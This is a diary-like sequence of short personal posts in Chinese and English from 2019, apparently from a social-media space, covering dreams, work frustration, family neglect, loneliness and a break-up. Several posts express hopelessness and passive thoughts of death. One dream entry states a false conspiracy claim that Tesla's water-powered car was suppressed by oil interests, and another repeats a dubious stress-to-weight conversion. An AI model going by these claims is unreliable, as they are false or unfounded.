<p>2019-03-25 13:41:03<br>人生好像是一个回顾的过程，就像回放视频一样，再经历一遍，剧情也无法改变。世界就好像一个驯兽场。人降生的时候，是一只野兽，但没有意识。世界用规则束缚着野兽，直到驯化成功之后，野兽才渐渐发觉自己已经被驯化，被压抑的天性折磨，此时要做回真正的野兽就再也不能了。野兽会陷入这样的怪圈。被驯化，觉醒，习惯性驯化自我。觉醒的一瞬间，想要逃脱，受到的最大阻力就来源于已达到自我驯化水平的野兽们。到最后竟会陷入自我怀疑，到底谁是主人。最最开始，究竟是谁制定的这样一套规则。我们全是这个终极玩家的游戏对象。</p>
</blockquote>
<blockquote>
<p>2019-03-27 12:37:21<br>我梦到了小学时最好的朋友，她生了小孩，然，是个很好的梦。昨天晚上</p>
</blockquote>
<blockquote>
<p>2019-03-31 00:56:06<br>什么时候没有禁忌了，什么时候就自由了。</p>
</blockquote>
<blockquote>
<p>2019-03-31 01:05:27<br>每次想到，不管是听到的还是看到的，都极可能是由一些人刻意制造的事实，就对许多东西信任不起来。就像见惯了假货，不管看到什么都会习惯性地先验证一番，不敢贸然不经过检验就将其归为真货。这样其实很累，警戒线永远紧绷，永远不敢放松，这种症状也许可以叫做缺乏对事实的安全感。</p>
</blockquote>
<blockquote>
<p>2019-03-31 01:47:33<br>when i recieve a call of problem dealing at 8:30 pm, actually i am not happy at all. everyone has his or her work time, does it? why must someday disturb others to solve problems that are not that emergency at wrong time? why is somebody so selfish, just focus on his or her things but ignore others’ schedule?</p>
</blockquote>
<blockquote>
<p>2019-03-31 16:16:11<br>“一切都消失在迷雾之中了。过去给抹掉了，而抹掉本身又被遗忘了，谎言便变成了真话。”</p>
</blockquote>
<blockquote>
<p>2019-04-01 07:41:35<br>在深夜疯狂发动引擎的工具究竟在为谁运作？</p>
</blockquote>
<blockquote>
<p>2019-04-01 21:31:20<br>一个大概一两岁小男孩见到我就叫我姐姐，咔咔咔，心情倍儿好</p>
</blockquote>
<blockquote>
<p>2019-04-06 02:34:27<br>both of them never care about me as their daughter. i am just like a tool that can be used to achieve their goals, but during the period, they even ask about nothing but the result. to their points, i am not a person with emotions, because they never focus on my emotional world. the most rediculous thing is that i behave as a robot like they demand me.</p>
</blockquote>
<blockquote>
<p>2019-04-11 18:49:13<br>听着并不真心的道歉，回以并不真心的原谅。</p>
</blockquote>
<blockquote>
<p>2019-04-16 09:05:52<br>最开始学数学的时候，老师讲大于、小于和等于的概念，然后让我们比较数字大小，填大于、小于、等于的符号。我当时以为是大鱼小鱼等鱼，就傻兮兮地觉得数字大的是大鱼，数字小的是小鱼，大鱼在左边就写大鱼符号，小鱼在左边就写小鱼符号，两个鱼一样大就写等鱼。这样理解好像也不会出错，but, 我就没搞清大鱼、小鱼的嘴巴到底该朝左还是朝右，也不知道后来是怎么学会的</p>
</blockquote>
<blockquote>
<p>2019-04-19 19:15:45<br>昨天晚上听着《年代向前看》听着听着就睡着了，灯也没关。</p>
</blockquote>
<blockquote>
<p>2019-04-19 19:19:46<br>昨天晚上做梦，就梦到好像透视到自己的大脑结构，然后看到大脑内部的一种液体颜色偏红且量太少。接着，自己又化身为医生，劝诫自己，大脑缺氧，不能让大脑长时间运作。</p>
</blockquote>
<blockquote>
<p>2019-04-22 00:15:57<br>有广告邮件可收竟然也觉得欣慰。</p>
</blockquote>
<blockquote>
<p>2019-05-02 08:52:16<br>昨天晚上做的梦清晰得一点也不像是梦。大概是要选总统，有人搞文革，我是被追杀的其中一个。背景整个就是在田间，季节是夏天。在梦里，我认为的安全地方是在水底，就跳到田里面，还把头埋进田底的泥土里面，然后拼命地游。还有关于骗婚的情节，有个男的高位截瘫，找不到女人，就通过什么方式去骗婚，具体是怎样的方式记不得了。总之，在梦里就是很紧张，大部分时间在水底，头埋在泥土里，但是却可以呼吸，一直处在逃命的状态。</p>
</blockquote>
<blockquote>
<p>2019-05-02 16:44:08<br>……你说什么呢？我车掉沟里了。</p>
</blockquote>
<blockquote>
<p>2019-05-05 01:27:52<br>入坑海淘，就像发现新大陆一样。生活少了发现新大陆的惊喜好像就没什么意思了。不淘不知道，一淘吓一跳，英镑比美元还贵，日元也没那么便宜希望宝贝们顺利地飘洋过海，别出什么幺蛾子</p>
</blockquote>
<blockquote>
<p>2019-05-07 01:04:04<br>可是我并没有分身术。大家肯定都会喜欢雇用孙悟空，不仅法术高强，还可以拔出免费的毫毛，变出许许多多法术高强的孙悟空，别说随机应变，八面玲珑都绰绰有余。事情做完了就变回毫毛，毕竟毫毛不用吃饭。</p>
</blockquote>
<blockquote>
<p>2019-05-07 20:03:42<br>地铁上一个小不点，一两岁的样子，一见我就乐，还叫我姐姐，哎呀，心情瞬间放晴。</p>
</blockquote>
<blockquote>
<p>2019-05-09 01:11:27<br>任何解决问题的沟通都需要一个人控场，不然大家都在七嘴八舌，真是晃瞎我的双眼。</p>
</blockquote>
<blockquote>
<p>2019-05-11 21:17:37<br>我弟弟说我该补脑了，今天问了他三次作业有没有写完……</p>
</blockquote>
<blockquote>
<p>2019-05-11 23:38:08<br>下午做梦梦到公司破产了，李晨和范冰冰结婚了，他们俩穿的都是印花礼服，李晨剃的板寸，头上冒了很多灰白的头发碴子，范冰冰脸上也有皱纹并且肚子有很多赘肉。为什么那么多人都说梦没有颜色?我的梦境都有颜色，遗憾的是没有气味。</p>
</blockquote>
<blockquote>
<p>2019-05-14 06:51:45<br>对于那些隐瞒事实，煽动情绪的作秀式宣传真是倍感恶心。</p>
</blockquote>
<blockquote>
<p>2019-05-14 20:59:49<br>我喜欢风，但不会执着地想要抓住，我喜欢，风，就是因为它抓不住。</p>
</blockquote>
<blockquote>
<p>2019-05-14 21:05:21<br>现在的幼儿园分班是这样的：樱桃1班，红橘2班，苹果3班……这样小孩子应该很喜欢去上学吧</p>
</blockquote>
<blockquote>
<p>2019-05-16 00:33:25<br>THANK GOD, I AM STILL ALIVE.</p>
</blockquote>
<blockquote>
<p>2019-05-16 07:34:01<br>我也是服了自己了，看到公交车司机的名字，瞬间就给他想了两个外号……这个公交司机的名字叫陆大银……陆大人大陆人呵呵呵呵呵</p>
</blockquote>
<blockquote>
<p>2019-05-16 07:37:37<br>醉醉的，大清早收到refund，TOPSHOP已从我的shopping list正式除名。</p>
</blockquote>
<blockquote>
<p>2019-05-16 07:40:54<br>我现在不敢保证能够坚持到七月份的尾巴</p>
</blockquote>
<blockquote>
<p>2019-05-16 19:16:43<br>shit!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p>
</blockquote>
<blockquote>
<p>2019-05-16 20:49:00<br>人生没有一点意思</p>
</blockquote>
<blockquote>
<p>2019-05-16 20:52:15<br>关我屁事，和我没半毛钱关系</p>
</blockquote>
<blockquote>
<p>2019-05-16 20:54:09<br>真是天真得要死</p>
</blockquote>
<blockquote>
<p>2019-05-16 20:56:36<br>真正悲伤的时候泪珠子不会往下掉，因为没有适合它的怀抱</p>
</blockquote>
<blockquote>
<p>2019-05-16 20:57:26<br>不必假客气</p>
</blockquote>
<blockquote>
<p>2019-05-16 21:11:01<br>从前有个人，他姓柯，名欧</p>
</blockquote>
<blockquote>
<p>2019-05-16 21:16:24<br>哭都哭不来了，哭从来就是一种表演，并且是需要人配合的表演，长期找不到人配合，就会丧失这项表演天赋。</p>
</blockquote>
<blockquote>
<p>2019-05-16 22:19:58<br>从来没像现在这样盼着周末</p>
</blockquote>
<blockquote>
<p>2019-05-17 07:45:04<br>良禽择木而栖</p>
</blockquote>
<blockquote>
<p>2019-05-18 15:51:58<br>如果我死了，世界也没什么不同，如果今天我会死，我好像也没什么非做不可的事情</p>
</blockquote>
<blockquote>
<p>2019-05-19 00:56:28<br>就让我烂成一滩泥吧</p>
</blockquote>
<blockquote>
<p>2019-05-19 01:56:01<br>当我在透支生命的时候，根本来不及想透支是想提前得到什么</p>
</blockquote>
<blockquote>
<p>2019-05-19 02:03:00<br>当时间完全绕着非自我而运转时，完全out of my control时，才深刻地体会到作为一个小部件的不自主。主人需要运作机器时，按一下开关，就只能毫无理由地运行，途中有些微磨损时，考虑到成本，主人会擦一点润滑油弥补损耗。直到完全坏掉，就把这个小部件换掉。因为总有许许多多备用的小部件挤破脑袋想要成为机器的一部分，坏掉的弃之如鸡肋。</p>
</blockquote>
<blockquote>
<p>2019-05-19 02:07:34<br>我消耗青春做的事对别人来说仅仅是备用工具在履行义务。</p>
</blockquote>
<blockquote>
<p>2019-05-19 12:17:47<br>真是傻得可以，傻得让人无语</p>
</blockquote>
<blockquote>
<p>2019-05-20 07:47:17<br>眼前看到的也是事实，但结合对未来的模糊想象，就会造成一叶障目的结果，看到的事实却歪曲了事实。</p>
</blockquote>
<blockquote>
<p>2019-05-22 18:37:25<br>看到别人因为自己而快乐，比自己快乐更快乐。</p>
</blockquote>
<blockquote>
<p>2019-05-23 22:40:02<br>不晓得小腿肚咋个浪痛</p>
</blockquote>
<blockquote>
<p>2019-05-23 22:44:40<br>就是操心命，凡事从手里过，根本没办法不操心</p>
</blockquote>
<blockquote>
<p>2019-05-24 13:12:39<br>跟我有很大关系?我还没吃那么饱</p>
</blockquote>
<blockquote>
<p>2019-05-24 19:59:58<br>哎呦我去，您可真是一朵大奇葩呢</p>
</blockquote>
<blockquote>
<p>2019-05-24 23:51:35<br>请允许我提前为六月许个愿，顺利毕业</p>
</blockquote>
<blockquote>
<p>2019-05-24 23:54:22<br>那些糟心的事好好排着队，过了六月份，怎样都可以，我绝对奉陪</p>
</blockquote>
<blockquote>
<p>2019-05-25 20:35:19<br>black blood from my body.I’ll die sooner or later.</p>
</blockquote>
<blockquote>
<p>2019-05-27 02:06:54<br>脑壳一哈子就开窍了</p>
</blockquote>
<blockquote>
<p>2019-05-27 20:07:33<br>在外面吹冷风，不为别的，只为了刺激一下肾上腺激素</p>
</blockquote>
<blockquote>
<p>2019-05-28 18:26:13<br>大清早就收到一张让人搞不清东南西北的缴费单，心情已经很一般了。什么东西，还是白纸黑字比较有依据，靠信任吗？算了吧，别把我卖了就谢天谢地了。</p>
</blockquote>
<blockquote>
<p>2019-05-29 12:31:50<br>政治任务四个字就能把人吓破胆，我是该说政治觉悟高呢还是政治求生欲强</p>
</blockquote>
<blockquote>
<p>2019-05-29 18:44:48<br>有的人真的是分分钟就能把你气死</p>
</blockquote>
<blockquote>
<p>2019-05-30 02:28:46<br>可真是个幼稚鬼呢</p>
</blockquote>
<blockquote>
<p>2019-06-02 01:49:24<br>我决定装死</p>
</blockquote>
<blockquote>
<p>2019-06-04 13:03:30<br>就连吃饭都觉得累</p>
</blockquote>
<blockquote>
<p>2019-06-04 13:53:19<br>临近crash的边缘，大脑早都不听我使唤了。</p>
</blockquote>
<blockquote>
<p>2019-06-05 20:31:54<br>一天天的破事多</p>
</blockquote>
<blockquote>
<p>2019-06-06 01:18:44<br>一边捂着心脏一边熬夜，就怕突然心跳超时嗝屁</p>
</blockquote>
<blockquote>
<p>2019-06-08 01:34:49<br>以前有段时间觉得聊天的时候结尾加上句号，表示我在很认真地讲话。直到现在，才觉得，喜欢用句号结尾的聊天真的太装逼了</p>
</blockquote>
<blockquote>
<p>2019-06-08 01:38:52<br>人不可貌相，要忘记第一印象</p>
</blockquote>
<blockquote>
<p>2019-06-08 23:51:20<br>终于，在12点之前，可以睡了</p>
</blockquote>
<blockquote>
<p>2019-06-13 12:53:14<br>每天都是爆肝的节奏</p>
</blockquote>
<blockquote>
<p>2019-06-14 17:10:34<br>你大爷！！！！！！！！！！！！</p>
</blockquote>
<blockquote>
<p>2019-06-15 01:06:27<br>项目经理了不起哦</p>
</blockquote>
<blockquote>
<p>2019-06-15 01:09:18<br>话都说不清楚还项目经理，见识了</p>
</blockquote>
<blockquote>
<p>2019-06-16 11:30:49<br>不过是花招伎俩</p>
</blockquote>
<blockquote>
<p>2019-06-20 08:04:40<br>不想起床</p>
</blockquote>
<blockquote>
<p>2019-06-20 14:08:00<br>正义的暴力就不是暴力吗</p>
</blockquote>
<blockquote>
<p>2019-06-22 03:00:58<br>头疼，半夜头特别疼</p>
</blockquote>
<blockquote>
<p>2019-06-22 03:27:49<br>前方雾霾，能见度低到看不清最近的未来</p>
</blockquote>
<blockquote>
<p>2019-06-26 00:52:27<br>一天天的，都在作死</p>
</blockquote>
<blockquote>
<p>2019-06-26 11:30:24<br>一杯红葡萄酒，泡着一根鲜血淋漓的断指头</p>
</blockquote>
<blockquote>
<p>2019-06-29 15:28:46<br>2019-6-28</p>
</blockquote>
<blockquote>
<p>2019-07-02 13:28:35<br>不用想过去，不用想未来，牢牢记住现在。现在是过去，现在也是未来。</p>
</blockquote>
<blockquote>
<p>2019-07-04 07:45:13<br>昨天晚上梦到了一年多没见的朋友，在梦里，我们拍了合照，在拍照之前，她还是很有洁癖，把周围的环境都收拾得干干净净。后来，我们居然在纸上辩论，就像QQ聊天一样，但是所有内容是用钢笔写在我的本子上。她说的大概意思是，女孩子喜欢钱就要表现出喜欢钱的样子，不要装清高。然后我就反省自己，喜欢钱吗？是在装清高吗？我回复的大概意思是，喜欢的不是钱，而是用钱换来的东西。又举了特斯拉的例子，特斯拉早就发现水可以驱动汽车，但是这个消息被汽油企业家封锁。这些财团就已经是将钱放在了人类共同利益之上了，爱钱可以，但不能太自私。</p>
</blockquote>
<blockquote>
<p>2019-07-04 21:52:37<br>为什么这么苦啊，太苦了</p>
</blockquote>
<blockquote>
<p>2019-07-07 09:53:55<br>奇葩多多，扯得很</p>
</blockquote>
<blockquote>
<p>2019-07-09 10:49:38<br>总有人迎面而来，总有人背身离去</p>
</blockquote>
<blockquote>
<p>2019-07-10 13:39:34<br>在世界和平这件事上面，月老可以大有作为的</p>
</blockquote>
<blockquote>
<p>2019-07-14 07:28:53<br>just do it. though the process suffers.</p>
</blockquote>
<blockquote>
<p>2019-07-17 02:08:07<br>肯把难以启齿的事告诉你，是想告诉你你是特别的存在</p>
</blockquote>
<blockquote>
<p>2019-07-25 08:02:12<br>知道无可救药之后，才肯逼自己吃一点早已过效的药</p>
</blockquote>
<blockquote>
<p>2019-07-26 06:27:06<br>昨天晚上梦到一个从没见过面的老太太，来自西藏。后来又梦到，在一个很宽很宽的河岸，有一只凤凰在天上回旋，有四次飞到我身上。还梦到了那个只见过一面的学跳舞的女生，我好像和她一起去做了工作。</p>
</blockquote>
<blockquote>
<p>2019-07-28 22:31:44<br>心口很痛很痛</p>
</blockquote>
<blockquote>
<p>2019-07-31 22:30:33<br>现世安稳否？一点也不</p>
</blockquote>
<blockquote>
<p>2019-08-02 13:23:34<br>现在觉得flag这个词是特别的亲切</p>
</blockquote>
<blockquote>
<p>2019-08-02 13:24:57<br>好喜欢下雨天</p>
</blockquote>
<blockquote>
<p>2019-08-02 13:26:10<br>玩一玩</p>
</blockquote>
<blockquote>
<p>2019-08-02 23:33:39<br>不能缺少榜样，找到榜样是一件很幸运的事，榜样是一束光，指引方向</p>
</blockquote>
<blockquote>
<p>2019-08-02 23:36:34<br>心里躁得很，很久没有这样强烈地感受到活着的生命力了</p>
</blockquote>
<blockquote>
<p>2019-08-03 12:50:16<br>这虚无、荒谬、怪诞的人生。一切都在毫无预兆中发生，好的、坏的。忙碌是有道理的，大家忙起来了，就不会想东想西，也不会有没来由的悲伤。现在的我二十二岁，二十二岁之后还有多少年属于我。人总是知道了deadline的前提下，才会好好珍惜现在的每一分每一秒，因为人们常常把无法预期的结束当作永远，永远就和未知一样的远。我想知道永远的终点。经常陷入一种幻觉，昨天的我到底是不是我。天底下的奇花异草真不少，有喜欢灵芝的，有喜欢雪莲的。让人爱不释手的总是罕见的，经常看到的，经常吃的，经常逛的，经常玩的，不过是习惯。风平浪静的海面，内心暗涌的是一场惊涛骇浪。黑白的生活厌倦了，总想抹点色彩，抹花的生活总得清洗。意志力是什么，心跳乱了一拍就会将它磨灭。意义是什么，是人类支撑自己毫无意义的人生的致幻剂。而香烟，只有懂的人才能闻到香味。这交叠的时空，同时存在春夏秋冬。这世界，同时存在喜怒哀乐。春天不会惊扰到冬天，欢喜也惊扰不到悲哀。整个世界可不就是一个多线程的程序。到底是什么保证了时间计算的准确性，如果有一天所有人都忘记了时间，是不是就从头开始算，开始新纪元。有时候放空自己，体验世界的平行感。the king of the world肯定特别懒，把欲望扔向人间之后就撒手不管。欲望让人们抢夺、竞赛、游戏。大家玩得不可开交，来不及想更多。很多很多无法解释的东西，我们都称作是自然现象。</p>
</blockquote>
<blockquote>
<p>2019-08-03 17:36:38<br>现在想起好多事，真的觉得是鬼使神差</p>
</blockquote>
<blockquote>
<p>2019-08-04 17:05:38<br>瓜不瓜的，都不管了</p>
</blockquote>
<blockquote>
<p>2019-08-04 20:45:34<br>“愿你找到一个像太阳一样的人，为你晒掉所有不值得一提的悲伤。”</p>
</blockquote>
<blockquote>
<p>2019-08-05 00:04:36<br>just like peroid, some emotion comes regularly.</p>
</blockquote>
<blockquote>
<p>2019-08-05 21:38:24<br>有些东西就不该触碰</p>
</blockquote>
<blockquote>
<p>2019-08-05 21:52:05<br>为什么心这么痛啊，太难受了</p>
</blockquote>
<blockquote>
<p>2019-08-06 23:17:33<br>末班车，希望赶上吧</p>
</blockquote>
<blockquote>
<p>2019-08-07 00:11:48<br>一点一点delete记忆的内存，等这一卷满了，就彻底清理</p>
</blockquote>
<blockquote>
<p>2019-08-07 13:27:35<br>人活在这个世界上，总免不了许多条条框框</p>
</blockquote>
<blockquote>
<p>2019-08-07 19:31:26<br>差一点点，就去买烟了</p>
</blockquote>
<blockquote>
<p>2019-08-07 21:16:20<br>“葡萄柚是柠檬和橙子的杂交，雪是愿望和哀悼的杂交。”</p>
</blockquote>
<blockquote>
<p>2019-08-07 22:47:50<br>加油，一定可以走出去</p>
</blockquote>
<blockquote>
<p>2019-08-08 19:17:27<br>希望夏天的一切都被秋天洗掉</p>
</blockquote>
<blockquote>
<p>2019-08-09 18:29:58<br>魔鬼和天使同源，我们把堕落的天使叫做魔鬼</p>
</blockquote>
<blockquote>
<p>2019-08-09 19:28:47<br>已经决定要换一个自己了</p>
</blockquote>
<blockquote>
<p>2019-08-09 23:26:04<br>希望各位好心人周末就放过我吧</p>
</blockquote>
<blockquote>
<p>2019-08-09 23:58:10<br>昨天晚上做梦，梦到自己和hongkong青年统一战线，还有些外国美女一起跳舞，卖包子那个姐姐也变成了跳舞很厉害的人。</p>
</blockquote>
<blockquote>
<p>2019-08-10 01:18:52<br>就让樱花在最美的时候死去，这是最好的结局</p>
</blockquote>
<blockquote>
<p>2019-08-10 12:23:12<br>“Everything happens in perfect timing.”</p>
</blockquote>
<blockquote>
<p>2019-08-10 13:11:36<br>天堂没有痛苦</p>
</blockquote>
<blockquote>
<p>2019-08-10 16:59:38<br>为什么有些留言不见了？！生气！</p>
</blockquote>
<blockquote>
<p>2019-08-11 21:17:25<br>头疼疼疼疼疼疼疼疼疼疼</p>
</blockquote>
<blockquote>
<p>2019-08-11 21:22:24<br>第一次体验到双倍的头痛，左脑右脑不间歇地痛</p>
</blockquote>
<blockquote>
<p>2019-08-12 20:50:57<br>特别不喜欢被强制安排</p>
</blockquote>
<blockquote>
<p>2019-08-13 02:10:00<br>不能前功尽弃，不能前功尽弃，不能前功尽弃，不能前功尽弃，不能前功尽弃，不能前功尽弃，不能前功尽弃</p>
</blockquote>
<blockquote>
<p>2019-08-13 07:45:47<br>今天还看到日出了</p>
</blockquote>
<blockquote>
<p>2019-08-13 10:16:37<br>自己都觉得自己矫情</p>
</blockquote>
<blockquote>
<p>2019-08-15 08:46:28<br>昨天晚上梦到在唱歌</p>
</blockquote>
<blockquote>
<p>2019-08-15 23:04:02<br>须知人生无常，聚散有时</p>
</blockquote>
<blockquote>
<p>2019-08-16 06:53:38<br>有几分民粹主义的味道</p>
</blockquote>
<blockquote>
<p>2019-08-17 07:03:59<br>论好心是如何胎死腹中的</p>
</blockquote>
<blockquote>
<p>2019-08-17 22:05:22<br>我就知道还是控制不住自己，还是前功尽弃</p>
</blockquote>
<blockquote>
<p>2019-08-18 07:49:16<br>很苦恼，最近都记不得做的梦了，只有模糊的印象。昨天晚上梦到了乱葬岗之类的东西</p>
</blockquote>
<blockquote>
<p>2019-08-20 11:55:39<br>不晓得吕雉的父母怎么想的，怎么取这样的名字</p>
</blockquote>
<blockquote>
<p>2019-08-20 11:58:14<br>昨天晚上梦到涂带金粉的指甲油，还梦到了可怕的东西</p>
</blockquote>
<blockquote>
<p>2019-08-21 06:25:05<br>昨天晚上梦到家人了，还梦到下大雨，梦到一件湖蓝色的卫衣</p>
</blockquote>
<blockquote>
<p>2019-08-21 06:33:14<br>把13岁叫做青春期是很准确的，感觉弟弟已经到了青春期，以后也没人陪我玩了</p>
</blockquote>
<blockquote>
<p>2019-08-21 06:35:47<br>突然有点理解那些爱养猫的人了</p>
</blockquote>
<blockquote>
<p>2019-08-21 22:19:25<br>把自己看成一个微不足道的点，很多事情就不必伤心也不值得难过</p>
</blockquote>
<blockquote>
<p>2019-08-22 06:56:16<br>昨天晚上梦到大学的漂亮室友亲我，还有鞭炮噼里啪啦，两条有攻击性的大鱼脸特别丑，在一个小鱼缸里抢水，祭祀仪式，有个小孩哭了，梦里面好像还是下雨了。</p>
</blockquote>
<blockquote>
<p>2019-08-22 12:43:28<br>想想快搬走了，还有点舍不得门卫大叔和门卫大哥</p>
</blockquote>
<blockquote>
<p>2019-08-23 12:46:04<br>肚子竟然痛得很有层次感</p>
</blockquote>
<blockquote>
<p>2019-08-25 08:16:48<br>曾经无法理解，人为什么会丢掉自我。现在有点明白了，丢掉自我是那么轻而易举。</p>
</blockquote>
<blockquote>
<p>2019-08-25 08:19:49<br>太小看定数了，该经的劫怎么都躲不掉。</p>
</blockquote>
<blockquote>
<p>2019-08-26 20:36:11<br>开工</p>
</blockquote>
<blockquote>
<p>2019-08-26 22:40:07<br>昨天晚上做了很多梦，其中一个梦，是有两个朋友去整容了，就是把下巴和额头调了顺序，脸的形状像一颗倒放的瓜子。</p>
</blockquote>
<blockquote>
<p>2019-08-26 22:41:11<br>哦，还有个梦，是跑路的房产中介被抓了</p>
</blockquote>
<blockquote>
<p>2019-08-27 08:26:41<br>my mom 半夜访问我空间，可把我给惊讶到了。</p>
</blockquote>
<blockquote>
<p>2019-08-27 18:53:32<br>今天中午竟然做梦了，梦到吃了一颗毒药，在毒发身亡之前醒来了。</p>
</blockquote>
<blockquote>
<p>2019-08-28 21:22:57<br>“完全没有缺乏的人，也不可能有更多的快乐了。”</p>
</blockquote>
<blockquote>
<p>2019-08-28 21:26:31<br>当知道朴信惠的鼻头也有一条沟的时候，就觉得自己没那么奇怪了</p>
</blockquote>
<blockquote>
<p>2019-08-28 22:08:20<br>想想以前的我，是多么地傻，多么地快乐，简称傻乐。</p>
</blockquote>
<blockquote>
<p>2019-08-30 00:36:46<br>好多好多好多新大陆</p>
</blockquote>
<blockquote>
<p>2019-08-30 22:49:53<br>我的网速没得问题嘛，这些个试运行的网站，用户体验也太差了吧……………………………………………………………………………………</p>
</blockquote>
<blockquote>
<p>2019-08-30 22:58:29<br>好像啥也没做，就这么晚了</p>
</blockquote>
<blockquote>
<p>2019-09-03 00:24:56<br>不管什么，都普通一点吧。普通的，没惊险的，anything.那些被我拖到现在的决定，差不多到了执行的时候。现在是最好的时候。现在，现在，现在。该搁置的，该忘记的，该放弃的，该清醒的，该找回的，自己。自欺欺人，自作多情，自作自受，自寻烦恼，自说自话，从头到尾，都是自己的大脑生了一场病，烧糊了。活着，总是没法和时间同步，要么慢一拍，沉湎过去，要么快一步，瞎想以后。以后，就是没有现在的以后，不敢多想。最近，身心都不舒服。喉咙发炎，痛得要命。心里啥都是空的，一天迷迷糊糊就没了。不晓得都是啥状态。一个人住久了，真的容易生病。好想和家人住在一起。我最大的愿望就是可以和家人一起生活。不是因为依赖，是需要那种氛围。生活的喜怒哀乐，一个人承受，实在有点憋得慌。一成不变的工作已经厌倦了。太容易厌倦了。就好像每天都吃同一道菜，不管当时多喜欢，久了就会厌倦。厌倦是已知的最差的生活状态了。现在想通了，心里根本不喜欢这样的工作。以前，就是在逼着自己去喜欢。面对不喜欢的东西，是激发不出创造力和生命力的。</p>
</blockquote>
<blockquote>
<p>2019-09-03 00:27:59<br>现在就是在跟自己的弱点死扛，太傻了，浪费时间，浪费生命。</p>
</blockquote>
<blockquote>
<p>2019-09-03 00:41:44<br>勇敢一点，跳出舒适圈。就像一直背着浮标，根本学不会游泳。</p>
</blockquote>
<blockquote>
<p>2019-09-06 02:59:38<br>在毫无心理准备的前提下，2点46分的电话被我接到了。</p>
</blockquote>
<blockquote>
<p>2019-09-06 23:40:26<br>人一旦有了ambition，affection的地位就变得无足轻重。</p>
</blockquote>
<blockquote>
<p>2019-09-06 23:48:32<br>灵魂的远大抱负，还是要交给脆弱易受伤的躯体执行，灵魂为了实现伟大猜想，只能驱使躯体去感知去摸索。</p>
</blockquote>
<blockquote>
<p>2019-09-07 23:43:47<br>听说每0.5g的压力会转换成0.5磅（约0.25kg，就是半斤）的体重。都不敢算自己有多少压力了</p>
</blockquote>
<blockquote>
<p>2019-09-09 18:47:49<br>不管是红玫瑰还是白玫瑰，都不应该娶到家里，玫瑰从来不该属于任何人。红玫瑰不想变成蚊子血，白玫瑰也不想变成衣服上令人厌恶的饭粒子。</p>
</blockquote>
<blockquote>
<p>2019-09-10 00:08:28<br>连续学了两天呼吸，第一天教练说人家两分钟就学会的，你还比你学了一个半小时之后游的好今天终于学划水，还被表扬了明天学新的</p>
</blockquote>
<blockquote>
<p>2019-09-10 00:09:49<br>永远不要丢掉自我，不管是为了谁。</p>
</blockquote>
<blockquote>
<p>2019-09-10 07:29:46<br>梦见自己给耳朵割双眼皮，真是个丧心病狂的梦。最近都梦到家人。</p>
</blockquote>
<blockquote>
<p>2019-09-10 18:13:02<br>扬言要做的事一般做不成，默默在心里打算的事大多数可以做到。</p>
</blockquote>
<blockquote>
<p>2019-09-11 18:44:33<br>穿高跟鞋基本上就是在作死。</p>
</blockquote>
<blockquote>
<p>2019-09-11 19:17:09<br>刚到，才知道游泳馆换水</p>
</blockquote>
<blockquote>
<p>2019-09-12 06:47:41<br>晚上睡觉之前，一定要记得把蚊香液插上，蚊子一点都不留情面的</p>
</blockquote>
<blockquote>
<p>2019-09-14 08:11:15<br>昨天晚上梦到了弟弟和他同学，其中有两个女同学，长得很可爱，但是头上有点秃块。</p>
</blockquote>
<blockquote>
<p>2019-09-17 00:19:55<br>curiousity is the source of my life. this fact never change. maybe i am multipotential.</p>
</blockquote>
<blockquote>
<p>2019-09-17 00:22:14<br>maybe today is a boundary of my life.</p>
</blockquote>
<blockquote>
<p>2019-09-17 00:24:07<br>我总觉得我的人生目前进入了第三段，并且第三段和第一段正在逐渐重合。第一个分界线是13岁，第二个分界线是21岁。那么再过13年是不是就形成闭环？</p>
</blockquote>
<blockquote>
<p>2019-09-17 00:26:51<br>现在感受到的东西，不管是天气、心情、还是经历的事，总让人觉得恍惚，特别像穿越到了13岁之前的时空。</p>
</blockquote>
<blockquote>
<p>2019-09-17 00:36:17<br>信任往往在一瞬间崩塌，任何一段关系都经不起谎言的戳穿。大脑老是要违背心的意愿，这也许就是人类必须忍受的折磨。</p>
</blockquote>
<blockquote>
<p>2019-09-17 00:40:04<br>拒绝常规，拒绝一成不变。</p>
</blockquote>
<blockquote>
<p>2019-09-17 00:45:09<br>说到底，人还是自私的。自私的同时，也是脆弱的。因为脆弱，就害怕交出完全的自我。人们总会担心背后被捅刀子，愿意让你站在背后，其实是证明对你放下了戒备，将脆弱袒露给你，不是因为傻，而是因为信任。</p>
</blockquote>
<blockquote>
<p>2019-09-17 18:32:34<br>千万千万别下雨</p>
</blockquote>
<blockquote>
<p>2019-09-18 21:05:05<br>今天泳池的水格外呛人。</p>
</blockquote>
<blockquote>
<p>2019-09-19 19:39:06<br>不知不觉，又进入了感冒的前奏，头晕晕晕晕晕晕晕晕晕晕晕晕晕</p>
</blockquote>
<blockquote>
<p>2019-09-29 19:33:09<br>多少还是有点寒心的</p>
</blockquote>
<blockquote>
<p>2019-09-30 06:37:40<br>又是被蚊子咬醒的一天，咋老不长记性</p>
</blockquote>
<blockquote>
<p>2019-09-30 06:55:39<br>人生不过逢场作戏，入戏太深便不得安宁。</p>
</blockquote>
<blockquote>
<p>2019-09-30 19:11:12<br>在祖国诞辰的前一天，突然觉得自己很惨。天黑的时候在外面还是会觉得害怕。</p>
</blockquote>
<blockquote>
<p>2019-10-05 16:32:13<br>原来这就是恋爱脑，愚蠢至极。多想想为什么吧。人是习惯的产物。包括行为习惯和思维习惯。</p>
</blockquote>
<blockquote>
<p>2019-10-07 14:42:59<br>在车上才发现今天衣服穿反了</p>
</blockquote>
<blockquote>
<p>2019-10-08 13:26:02<br>发乎于情止乎礼。</p>
</blockquote>
<blockquote>
<p>2019-10-08 13:56:09<br>甜言蜜语说给傻子听</p>
</blockquote>
<blockquote>
<p>2019-10-08 13:57:19<br>是该放手的时候了</p>
</blockquote>
<blockquote>
<p>2019-10-08 14:00:28<br>现在的你很让人失望知道吗，很让人看不起，再忍不住想念也不能说出口，记住了</p>
</blockquote>
<blockquote>
<p>2019-10-08 14:01:06<br>何曾想过自己会到这步田地</p>
</blockquote>
<blockquote>
<p>2019-10-09 07:02:43<br>算了吧，自己作的苦还是自己吞下，就开心吧，不要一副可怜巴拉的样子。</p>
</blockquote>
<blockquote>
<p>2019-10-09 07:19:59<br>见不得光的感情，就不要深陷进去。</p>
</blockquote>
<blockquote>
<p>2019-10-10 06:07:46<br>昨晚上梦到宿舍生活，收拾整理东西，看来脑子是太乱了，做梦都在整理。</p>
</blockquote>
<blockquote>
<p>2019-10-11 06:41:32<br>没有完美的爱人</p>
</blockquote>
<blockquote>
